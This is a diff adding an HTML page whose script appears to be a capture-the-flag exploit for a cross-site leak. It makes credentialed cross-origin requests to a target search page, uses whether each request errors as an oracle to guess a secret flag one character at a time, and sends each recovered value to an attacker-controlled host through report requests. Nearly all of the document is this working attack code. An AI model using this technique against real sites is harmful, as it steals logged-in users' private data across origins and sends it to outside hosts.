@@ -1,0 +1,67 @@
+<html>
+<head>
+<script>
+alpha = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z","0","1","2","3","4","5","6","7","8","9"]
+
+hostname = "http://web:8080"
+//hostname = "http://127.0.0.1:4900"
+
+async function guessflag(url) {
+  return fetch("{{ host }}/redirect?n=0&data="+btoa(url), {mode: 'no-cors',credentials: 'include'}).then(() => {return "no"}, (error) => {return "yes"});
+}
+
+
+function sleep(ms) {
+  return new Promise(resolve => setTimeout(resolve, ms));
+}
+
+var timestamp1 = new Date().getTime();
+
+async function main() {
+  flag = "{{ flag }}"
+  fetch("/"+flag)
+  console.log("Hello");
+  foundflag = false
+  await sleep(1000);
+  i = {{ i }}
+  while (foundflag == false) {
+    candidates = []
+    while (i < alpha.length){
+      if (new Date().getTime() > timestamp1 + 50000) {
+        fetch("{{ host }}/sendingreport")
+        fetch("{{ host }}/report?flag="+flag+"&i="+i.toString());
+        await sleep(10000)
+      }
+      console.log(alpha[i])
+      res = await guessflag(hostname+"/?page=2&query={{ query }}|"+flag+alpha[i])
+      console.log(res)
+      fetch("{{ host }}"+"/"+res)
+      if (res == "no") {
+        candidates.push(alpha[i])
+        i = 0
+        break;
+      }
+      i += 1
+    }
+    i = 0
+    if (candidates.length == 1) {
+      flag += candidates[0]
+      console.log(flag)
+    } else if (candidates.length == 0){
+      flag += "."
+      console.log(flag)
+    }
+    fetch("/"+flag)
+    if (flag.includes("is.a.bit")){
+      return;
+    }
+  }
+}
+main()
+
+</script>
+</head>
+<body>
+  yay loaded
+</body>
+</html>
